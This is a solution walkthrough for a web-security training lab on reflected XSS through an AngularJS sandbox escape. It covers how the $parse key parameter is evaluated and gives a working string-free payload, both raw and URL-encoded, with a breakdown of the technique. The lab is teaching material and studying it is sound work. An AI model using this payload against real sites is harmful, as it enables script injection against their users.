# XSS LAB 25 - Reflected XSS with AngularJS sandbox escape without strings

## Manual Solution


### 1. Before you start:
- Before starting, make sure to read the following articles:
    - [XSS Without HTML: Client-Side Template Injection with AngularJS](https://portswigger.net/research/xss-without-html-client-side-template-injection-with-angularjs)
    - [Client-Side Template Injection](https://portswigger.net/web-security/cross-site-scripting/contexts/client-side-template-injection)

### 2. Access the Lab.
- Open the Web Security Academy lab environment in your browser.

### 3. Perform a search.
- Perform a search and inspect DOM. You will find the vulnerable script.
```html
<script>angular.module('labApp', []).controller('vulnCtrl',function($scope, $parse) {
    $scope.query = {};
    var key = 'search';
    $scope.query[key] = 'abc';
    $scope.value = $parse(key)($scope.query);
});</script>
<h1 ng-controller=vulnCtrl>0 search results for {{value}}</h1>
```
- This script creates a query object. The `search` key assigned to the query object, the value `abc` is inserted as a counterpart to the key
- The `query` object becomes:
```js
$scope.query = {
    search: 'abc'
}
```
- The `$parse` function takes the key parses it into an AngularJS expression. 

### 4. New Search and Query Reflection:
- To test the vulnerability, perform a new search using a URL like `search=abc&x=abcd`. The script will execute and display the following output
```html
<script>angular.module('labApp', []).controller('vulnCtrl',function($scope, $parse) {
    $scope.query = {};
    var key = 'search';
    $scope.query[key] = 'abc';
    $scope.value = $parse(key)($scope.query); //$scope.value = 'abc'
    var key = 'x';
    $scope.query[key] = 'abcd';
    $scope.value = $parse(key)($scope.query); //$scope.value = 'abcd'
});</script>
<h1 ng-controller=vulnCtrl>0 search results for {{value}}</h1>
```
- The query object becomes:
```js
$scope.query = {
    search: 'abc',x:'abcd'
}
```
- As you can see, the second query parameter (x=abcd) is reflected on the page. This shows how user input can be parsed and executed demonstrating the vulnerability.

### 5.Exploiting the `$parse` function
- In this lab, we can abuse the `$parse` service . The $parse function takes a string and turns it into a function. Since we can control the key parameter, we can manipulate the query string.
- Perform a search with the url `search=abc&2%2B2=abcd` the `2%2B2` becomes `2+2`. The parse evaluates 2+2 as a mathematical operation. You will see "0 search results for 4" on the page. 
- Therefore we can inject arbitary queries into the key parameter.

### 6. Bypassing the AngularJS sandbox:
- We need to bypass the angular sandbox. As the lab description states the `$eval` function and string expressions cannot be used. However, there are various ways to bypass the AngularJS sandbox.
- Refer to the AngularJS sandbox escapes section in the [PortSwigger XSS Cheat Sheet](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#angularjs-sandbox-escapes-reflected) for additional payloads and techniques.
- After reviewing the cheat sheet we found a suitable xss payload. 
- Payload:
 ```js
toString().constructor.prototype.charAt=[].join;[1,2]|orderBy:toString().constructor.fromCharCode(120,61,97,108,101,114,116,40,49,41)
```
- Encoded:
```js
toString().constructor.prototype.charAt%3D[].join;[1,2]|orderBy:toString().constructor.fromCharCode(120,61,97,108,101,114,116,40,49,41)
```
- Copy the encoded payload, paste it into the second key section of the URL and hit enter.
- The lab is now completed

### 7. Understanding the XSS payload:
- Let's break down the XSS payload.
- `toString().constructor.prototype.charAt = [].join;` modifies the charAt method to use the `[].join method`. The charAt method normally returns a specific character at a given index from a string, while `[].join` combines the elements of an array into a single string. This means that every time `charAt` is called, `[].join` will be executed instead.
- This manipulation affects the `isIdent()` controller.
- You can read more about the `isIdent()` controller here: [XSS Without HTML: Client-Side Template Injection with AngularJS](https://portswigger.net/research/xss-without-html-client-side-template-injection-with-angularjs)
- More information about the `chatAt()` and `join()` methods:
    - [String.prototype.charAt - MDN](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/String/charAt)
    - [Array.prototype.join - MDN](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Array/join)
- `toString().constructor.fromCharCode(120,61,97,108,101,114,116,40,49,41)` The fromCharCode methot converts ASCII codes into a string.
- 120 → 'x' 61 → '=' 97 → 'a' 108 → 'l' 101 → 'e' 114 → 'r' 116 → 't' 40 → '(' 49 → '1' 41 → ')' `x=alert(1)`
- `[1,2]|orderBy` is used to execute the `x=alert(1)` string.

## Automated Solution

### 1. Download the script
### 2. Run the script with the following command:
```sh
python xss_lab_25.py -u <target_url> -p (if you want to use proxy 127.0.0.1:8080)
```